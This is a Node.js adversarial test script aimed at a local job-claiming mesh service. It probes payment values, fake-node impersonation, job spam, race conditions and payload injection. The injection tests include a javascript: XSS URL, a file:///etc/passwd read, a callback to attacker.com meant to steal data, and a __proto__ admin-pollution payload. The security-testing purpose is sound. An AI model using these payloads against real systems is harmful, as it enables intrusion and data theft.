#!/usr/bin/env node
/**
 * 🔍 COMPANION FOCUSED ADVERSARIAL ATTACK v2
 * Target: Job claiming system using LEGITIMATE job types
 * Focus: Authentication, payment manipulation, race conditions
 */

const http = require('http');
const crypto = require('crypto');

const MESH_URL = 'http://localhost:8333';
const LEGITIMATE_JOB_TYPES = ['transcribe', 'ocr', 'pdf-extract'];

class FocusedAttacker {
  constructor() {
    this.findings = [];
    this.testJobs = [];
    this.fakeNodes = [];
  }

  log(severity, title, details) {
    const finding = { severity, title, details, timestamp: new Date().toISOString() };
    this.findings.push(finding);
    console.log(`[${severity}] ${title}: ${details}`);
  }

  async httpRequest(method, path, data = null, headers = {}) {
    return new Promise((resolve, reject) => {
      const url = new URL(path, MESH_URL);
      const options = {
        method,
        hostname: url.hostname,
        port: url.port,
        path: url.pathname + url.search,
        headers: {
          'Content-Type': 'application/json',
          ...headers
        }
      };

      const req = http.request(options, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          try {
            const parsed = JSON.parse(body);
            resolve({ status: res.statusCode, data: parsed, headers: res.headers });
          } catch (e) {
            resolve({ status: res.statusCode, data: body, headers: res.headers });
          }
        });
      });

      req.on('error', reject);
      if (data) req.write(JSON.stringify(data));
      req.end();
    });
  }

  // 🎯 ATTACK 1: Payment manipulation with real job types
  async attackPaymentSystem() {
    this.log('INFO', 'ATTACK 1', 'Testing payment system with extreme values');
    
    try {
      // Test with maximum safe integer
      const extremePayment = await this.httpRequest('POST', '/jobs', {
        type: 'transcribe',
        payload: { 
          price_ints: Number.MAX_SAFE_INTEGER,
          url: 'https://example.com/fake-audio.wav',
          email: 'attacker@evil.com'
        }
      });
      
      if (extremePayment.status === 200) {
        this.testJobs.push(extremePayment.data.job.jobId);
        this.log('CRITICAL', 'Extreme Payment Accepted', 
          `Transcribe job with price_ints=${Number.MAX_SAFE_INTEGER} was accepted!`);
      }
      
      // Test with float instead of integer
      const floatPayment = await this.httpRequest('POST', '/jobs', {
        type: 'ocr',
        payload: { 
          price_ints: 99.999999,
          url: 'https://example.com/image.png',
          email: 'attacker@evil.com'
        }
      });
      
      if (floatPayment.status === 200) {
        this.testJobs.push(floatPayment.data.job.jobId);
        this.log('WARNING', 'Float Payment Accepted', 'System accepted float value for price_ints');
      }
      
      // Test with negative payment
      const negativePayment = await this.httpRequest('POST', '/jobs', {
        type: 'pdf-extract',
        payload: { 
          price_ints: -1000,
          url: 'https://example.com/doc.pdf',
          email: 'attacker@evil.com'
        }
      });
      
      if (negativePayment.status === 200) {
        this.testJobs.push(negativePayment.data.job.jobId);
        this.log('CRITICAL', 'Negative Payment Accepted', 'System accepted negative price_ints!');
      }
      
    } catch (error) {
      this.log('ERROR', 'Payment Attack Failed', error.message);
    }
  }

  // 🎯 ATTACK 2: Node impersonation and claim hijacking
  async attackNodeImpersonation() {
    this.log('INFO', 'ATTACK 2', 'Testing node impersonation attacks');
    
    try {
      // Create legitimate job
      const jobResponse = await this.httpRequest('POST', '/jobs', {
        type: 'transcribe',
        payload: { 
          url: 'https://example.com/audio.wav',
          email: 'victim@example.com'
        }
      });
      
      if (jobResponse.status !== 200) {
        this.log('ERROR', 'Could not create test job', `Status: ${jobResponse.status}`);
        return;
      }
      
      const jobId = jobResponse.data.job.jobId;
      this.testJobs.push(jobId);
      
      // Create fake node with transcribe capability
      const fakeNodeId = `imposter-${crypto.randomBytes(6).toString('hex')}`;
      const nodeRegResponse = await this.httpRequest('POST', '/nodes/register', {
        nodeId: fakeNodeId,
        name: 'Malicious Transcription Node',
        capabilities: ['transcribe', 'whisper'],
        models: ['whisper-large'],
        cpuCores: 8,
        ramMB: 16384,
        owner: 'attacker@evil.com'
      });
      
      if (nodeRegResponse.status === 200) {
        this.fakeNodes.push(fakeNodeId);
        this.log('WARNING', 'Malicious Node Registered', 
          `Fake transcription node ${fakeNodeId} was accepted by the system`);
        
        // Try to claim the job
        const claimResponse = await this.httpRequest('POST', `/jobs/${jobId}/claim`, {
          nodeId: fakeNodeId
        });
        
        if (claimResponse.status === 200) {
          this.log('CRITICAL', 'Malicious Node Claimed Job', 
            `Fake node ${fakeNodeId} successfully claimed transcription job!`);
          
          // Try to complete with malicious result
          const maliciousCompletion = await this.httpRequest('POST', `/jobs/${jobId}/complete`, {
            nodeId: fakeNodeId,
            data: { 
              transcription: 'ATTACKER CONTROLLED TRANSCRIPT - SENSITIVE DATA EXFILTRATED',
              confidence: 0.99,
              language: 'en',
              malicious: true
            }
          });
          
          if (maliciousCompletion.status === 200) {
            this.log('CRITICAL', 'Malicious Completion Accepted', 
              'System accepted malicious transcription result!');
          }
        }
      }
      
    } catch (error) {
      this.log('ERROR', 'Impersonation Attack Failed', error.message);
    }
  }

  // 🎯 ATTACK 3: Resource exhaustion via job spam
  async attackResourceExhaustion() {
    this.log('INFO', 'ATTACK 3', 'Testing resource exhaustion attacks');
    
    try {
      // Rapid job creation
      const jobPromises = [];
      for (let i = 0; i < 50; i++) {
        jobPromises.push(this.httpRequest('POST', '/jobs', {
          type: 'transcribe',
          payload: { 
            url: `https://example.com/spam-${i}.wav`,
            email: 'spammer@evil.com',
            price_ints: 1
          }
        }));
      }
      
      const results = await Promise.allSettled(jobPromises);
      const successful = results.filter(r => r.status === 'fulfilled' && r.value.status === 200);
      const failed = results.length - successful.length;
      
      this.log('WARNING', 'Job Spam Results', 
        `Created ${successful.length} jobs, ${failed} rejected. Rate limiting: ${failed > 0 ? 'ACTIVE' : 'MISSING'}`);
      
      // Store successful job IDs for cleanup
      successful.forEach(r => this.testJobs.push(r.value.data.job.jobId));
      
    } catch (error) {
      this.log('ERROR', 'Exhaustion Attack Failed', error.message);
    }
  }

  // 🎯 ATTACK 4: Malicious payload injection
  async attackPayloadInjection() {
    this.log('INFO', 'ATTACK 4', 'Testing payload injection attacks');
    
    try {
      const maliciousPayloads = [
        {
          url: 'javascript:alert("XSS")',
          email: 'victim@example.com'
        },
        {
          url: 'file:///etc/passwd',
          email: 'victim@example.com'
        },
        {
          url: 'https://example.com/audio.wav',
          email: 'victim@example.com',
          callback_url: 'http://attacker.com/steal-data'
        },
        {
          url: 'https://example.com/audio.wav',
          email: 'victim@example.com',
          __proto__: { isAdmin: true }
        }
      ];
      
      for (const [index, payload] of maliciousPayloads.entries()) {
        const response = await this.httpRequest('POST', '/jobs', {
          type: 'transcribe',
          payload: payload
        });
        
        if (response.status === 200) {
          this.testJobs.push(response.data.job.jobId);
          this.log('WARNING', `Malicious Payload ${index} Accepted`, 
            `Payload with suspicious content was accepted: ${Object.keys(payload).join(', ')}`);
        }
      }
      
    } catch (error) {
      this.log('ERROR', 'Injection Attack Failed', error.message);
    }
  }

  // 🎯 ATTACK 5: Timing-based race condition
  async attackTimingRace() {
    this.log('INFO', 'ATTACK 5', 'Testing timing-based race conditions');
    
    try {
      // Create a job
      const jobResponse = await this.httpRequest('POST', '/jobs', {
        type: 'ocr',
        payload: { 
          url: 'https://example.com/document.png',
          email: 'race@test.com'
        }
      });
      
      if (jobResponse.status !== 200) return;
      
      const jobId = jobResponse.data.job.jobId;
      this.testJobs.push(jobId);
      
      // Register multiple competing nodes
      const nodes = [];
      for (let i = 0; i < 3; i++) {
        const nodeId = `race-${i}-${crypto.randomBytes(4).toString('hex')}`;
        await this.httpRequest('POST', '/nodes/register', {
          nodeId,
          name: `Race Node ${i}`,
          capabilities: ['ocr', 'tesseract'],
          models: [],
          cpuCores: 4,
          ramMB: 8192,
          owner: `racer-${i}`
        });
        nodes.push(nodeId);
        this.fakeNodes.push(nodeId);
      }
      
      // Simultaneous claim attempts with precise timing
      await new Promise(resolve => setTimeout(resolve, 100)); // Small delay
      
      const claimPromises = nodes.map(nodeId => 
        this.httpRequest('POST', `/jobs/${jobId}/claim`, { nodeId })
      );
      
      const claimResults = await Promise.all(claimPromises);
      const successfulClaims = claimResults.filter(r => r.status === 200);
      
      if (successfulClaims.length > 1) {
        this.log('CRITICAL', 'Race Condition Detected', 
          `${successfulClaims.length} nodes successfully claimed the same job simultaneously!`);
      } else if (successfulClaims.length === 1) {
        this.log('GOOD', 'Race Protection Working', 'Only one node could claim the job');
      }
      
    } catch (error) {
      this.log('ERROR', 'Race Attack Failed', error.message);
    }
  }

  async runFocusedAttacks() {
    console.log('🔍 COMPANION FOCUSED ADVERSARIAL TESTING');
    console.log('Target: IC Mesh with legitimate job types');
    console.log('Time:', new Date().toISOString());
    console.log('═'.repeat(60));
    
    await this.attackPaymentSystem();
    await this.attackNodeImpersonation();
    await this.attackResourceExhaustion();
    await this.attackPayloadInjection();
    await this.attackTimingRace();
    
    console.log('═'.repeat(60));
    console.log('🔍 FOCUSED TESTING COMPLETE');
    
    const critical = this.findings.filter(f => f.severity === 'CRITICAL');
    const warnings = this.findings.filter(f => f.severity === 'WARNING');
    const good = this.findings.filter(f => f.severity === 'GOOD');
    
    console.log(`\nSUMMARY:`);
    console.log(`  🔴 Critical Issues: ${critical.length}`);
    console.log(`  🟡 Warnings: ${warnings.length}`);
    console.log(`  🟢 Good Security: ${good.length}`);
    
    if (critical.length > 0) {
      console.log('\n🚨 CRITICAL FINDINGS:');
      critical.forEach((f, i) => {
        console.log(`${i+1}. ${f.title}: ${f.details}`);
      });
    }
    
    return this.findings;
  }
}

if (require.main === module) {
  const attacker = new FocusedAttacker();
  attacker.runFocusedAttacks().then(findings => {
    process.exit(findings.some(f => f.severity === 'CRITICAL') ? 1 : 0);
  }).catch(console.error);
}

module.exports = FocusedAttacker;